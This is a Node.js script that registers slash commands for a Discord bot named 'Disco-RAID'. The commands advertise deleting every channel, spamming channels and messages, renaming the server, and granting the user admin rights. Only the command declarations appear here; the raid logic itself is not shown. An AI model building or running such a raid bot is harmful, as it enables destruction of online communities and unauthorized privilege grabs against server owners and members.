const { REST, Routes, ApplicationCommandOptionType, ApplicationCommandPermissionType } = require('discord.js');
require('dotenv').config({path:'../.env'})

const commands = [
    {
        name: 'online',
        description: 'Checks if Disco-RAID is online.',
    },
    {
      name: 'raid',
      description: "deletes all channels and spams channels/messages. PERMISSION_REQUIRED: {MANAGE CHANNELS}",
      options : [
        {
        name: "raid-message",
        description: 'message that should be spammed afer raid.',
        type: ApplicationCommandOptionType.String,
      },
      {
        name: 'message-amount',
        description: 'how many times should the bot spam channels to the server.',
        type: ApplicationCommandOptionType.Integer

      },
      {
        name: 'channel-name',
        description: "the name of the channels made, end in -{channel number}",
        type: ApplicationCommandOptionType.String
      }
    ]
    
    }, 
    
    {
      name: 'server-name',
      description: "change the server name. PERMISSION_REQUIRED: {MANAGE SERVER} ",
      options: [{
        name: 'server_name',
        description: 'what the server name should be changed to.',
        type: ApplicationCommandOptionType.String
      }
      ]
    } , 
    {
      name: 'admin-self',
      description: "Give the user ADMIN permissions."

    }
 
];



const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');

    await rest.put(
      Routes.applicationCommands(
        process.env.CLIENT_ID,
        process.env.GUILD_ID
      ),
      { body: commands }
    );

    console.log('Slash commands were registered successfully!');
  } catch (error) {
    console.log(`There was an error: ${error}`);
  }
})();